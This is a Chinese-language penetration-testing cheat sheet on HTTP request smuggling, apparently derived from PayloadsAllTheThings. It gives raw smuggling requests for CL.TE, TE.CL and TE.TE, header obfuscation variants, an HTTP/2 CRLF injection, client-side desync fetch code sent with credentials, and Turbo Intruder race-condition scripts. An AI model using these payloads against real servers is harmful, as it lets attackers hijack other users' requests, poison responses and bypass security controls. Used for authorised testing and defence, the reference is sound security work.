# Request Smuggling - HTTP请求走私

[SEARCH_KEYWORDS]
漏洞类型: Request Smuggling HTTP Request Smuggling 请求走私 HTTP Desync
攻击类型: Request Hijacking Response Poisoning Security Bypass
关键词: Content-Length Transfer-Encoding chunked CL TE
类型: CL.TE TE.CL TE.TE HTTP/2 Client-Side Desync
技术: Last-byte Sync Single-packet Attack Pipeline

[CONTENT]

## HTTP请求走私概述

当多个组件处理请求但对请求起始/结束位置判断不一致时，会发生HTTP请求走私。这种分歧可用于干扰其他用户的请求/响应或绕过安全控制。

## 漏洞类型

### CL.TE漏洞

前端使用Content-Length，后端使用Transfer-Encoding：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL漏洞

前端使用Transfer-Encoding，后端使用Content-Length：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### TE.TE漏洞

两端都支持Transfer-Encoding，但可被混淆绕过：

```powershell
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
```

## HTTP/2请求走私

HTTP/2请求可被转换为HTTP/1.1，走私无效的Content-Length、Transfer-Encoding或CRLF：

```ps1
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

## Client-Side Desync

某些路径不期望POST请求，将其视为GET请求，忽略payload：

```http
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

### 利用代码

```javascript
fetch('https://www.example.com/', {
    method: 'POST',
    body: "GET / HTTP/1.1\r\nHost: www.example.com",
    mode: 'no-cors',
    credentials: 'include'
})
```

## 攻击技术

### HTTP/1.1 Last-byte同步

发送除最后一个字节外的所有请求，然后"释放"每个请求：

```python
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```

### HTTP/2 Single-packet攻击

约20-30个请求同时到达服务器，消除网络抖动。

## Turbo Intruder脚本

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.start(timeout=5)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

## 工具

- HTTP Request Smuggler - Burp请求走私扩展
- Smuggler - HTTP请求走私测试工具
- Turbo Intruder - 大量HTTP请求发送工具

## 参考文档

原始来源: PayloadsAllTheThings/Request Smuggling/README.md